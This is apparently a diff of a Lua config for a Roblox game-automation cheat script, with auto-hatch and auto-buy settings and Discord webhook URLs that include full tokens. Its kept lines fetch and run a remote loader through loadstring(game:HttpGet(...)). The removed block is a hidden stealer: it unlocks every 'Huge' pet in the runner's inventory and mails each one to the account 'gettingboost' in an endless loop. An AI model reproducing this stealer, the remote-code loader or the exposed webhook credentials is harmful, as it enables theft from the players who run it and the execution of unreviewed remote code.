@@ -8,15 +8,15 @@ getgenv().Config = {
         ["AutoFlags"] = {"Fortune Flag"}
     },
     ["Webhook"] = {
-        ["HugeURL"] = "https://discord.com/api/webhooks/1273665273848795167/5ig7c7YSn7YINFekOfz0oaUGiyxFIsttzMzDGG_-IJNm6QctEAsrRfLDe1IDaRMtN1Bl",
+        ["HugeURL"] = "https://discord.com/api/webhooks/1259840141891993693/p7HOwN5nOh1mWRPZ1H5XuScIXBRZ09ctlFKHAKC_ZMbAR_8lf7LjIn0gHElpCaLIKaR8",
         ["StatsURL"] = "https://discord.com/api/webhooks/1287408801695141949/0FPeclZ20tvbQG_q5dIAs9MfSDvkrklL0eGN86JvK7dErVvXTdrNeVWRlumQUKQY88CN",
-        ["UserID"] = "807267031929716776",
+        ["UserID"] = "",
         ["SendEvery"] = 15
     },
     ["Misc"] = {
         ["AutoHatch"] = true,
         ["AutoDaycare"] = true,
-        ["UltraFPS"] = true,
+        ["UltraFPS"] = false,
     },
     ["Elemental"] = {
         ["AutoBuyCubes"] = {"Pet Cube", "Ultra Pet Cube"},
@@ -25,37 +25,3 @@ getgenv().Config = {
     }
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2bdebaf848a6be382ed338dad329aaf2.lua"))()
-
-wait(15)
-task.wait(30)
-getgenv().MailToUser = "gettingboost"
-
-local Network = require(game.ReplicatedStorage.Library.Client.Network)
-
-while true do
-    local HugeUIDList = {}
-
-    -- Collect Huge Pets
-    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
-        if PetData.id:find("Huge ") then
-            table.insert(HugeUIDList, PetUID)
-            if PetData._lk then
-                repeat
-                    task.wait()
-                until Network.Invoke("Locking_SetLocked", PetUID, false)
-                print("Unlocked", PetUID)
-            end
-        end
-    end
-
-    -- Send Pets via Mail
-    for _, PetUID in pairs(HugeUIDList) do
-        repeat
-            task.wait()
-        until Network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
-        print("Sent", PetUID)
-    end
-
-    -- Wait before repeating
-    task.wait(30)  -- Wait for 30 seconds before running again
-end
